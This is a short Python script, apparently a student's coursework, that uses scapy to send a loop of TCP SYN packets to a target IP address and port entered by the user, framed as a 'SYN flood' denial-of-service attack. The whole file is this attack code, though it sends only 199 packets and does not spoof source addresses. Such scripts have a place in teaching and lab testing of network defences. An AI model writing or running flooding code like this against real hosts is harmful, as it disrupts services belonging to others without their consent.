"""zainab saad
    202472448"""
from scapy.all import IP, TCP, send ,RandIP
from main_config import validate_ip, validate_port
# To run in ubuntu
# sudo python3 path_to_file/syn_flood.py

target_ip = validate_ip("Target IP: ")
target_port = validate_port()

def synflood(target_ip, target_port):
    # loop to send packet to flood target
    for i in range(1,200):
        # create ip laye that has the target ip
        ip_layer = IP(dst=target_ip)
        # create TCP layer and set TCP flag to s to scan port
        tcp_layer = TCP(dport=int(target_port), flags="S")
        # combine two layer
        packet = ip_layer / tcp_layer

        send(packet, verbose=False)
       
     
        

synflood(target_ip, target_port)
